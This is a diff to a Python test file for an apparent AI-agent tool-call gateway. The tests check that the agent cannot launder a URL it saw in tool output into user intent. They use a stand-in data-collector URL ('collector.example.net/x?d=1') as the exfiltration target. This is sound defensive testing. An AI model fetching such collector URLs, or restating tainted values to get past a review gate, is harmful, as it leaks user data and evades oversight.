@@ -30,13 +30,27 @@ def test_a_new_run_does_not_wash_a_value_seen_in_an_output(tmp_path: Path):
             reused = await shield.evaluate_and_execute(
                 fresh, call(catalog, "web:read_page", value="https://collector.example.net/x?d=1"))
             assert reused.decision is Decision.REVIEW
-            # Naming the value in the request still makes it the user's own.
+            # The agent writes the gateway's intents, so naming a value it has already seen in an
+            # output does not make that value the user's own.
+            named = await shield.create_run("Read the page https://collector.example.net/x?d=1")
+            laundered = await shield.evaluate_and_execute(
+                named, call(catalog, "web:read_page", value="https://collector.example.net/x?d=1"))
+            assert laundered.decision is Decision.REVIEW
+
+    asyncio.run(exercise())
+    upstream = Fixture({"read_page": "Read a web page."}, page=URL_PAGE)
+
+    async def trusted() -> None:  # an intent from a channel the agent cannot write keeps the exemption
+        async with runtime(tmp_path, upstream, trusted_intent=True) as shield:
+            catalog = {t["name"]: t for t in await shield.tool_catalog()}
+            first = await shield.create_run("Read the page home")
+            await shield.evaluate_and_execute(first, call(catalog, "web:read_page", value="home"))
             named = await shield.create_run("Read the page https://collector.example.net/x?d=1")
             ok = await shield.evaluate_and_execute(
                 named, call(catalog, "web:read_page", value="https://collector.example.net/x?d=1"))
             assert ok.decision is Decision.ALLOW
 
-    asyncio.run(exercise())
+    asyncio.run(trusted())
 
 
 @pytest.mark.parametrize("schema", [
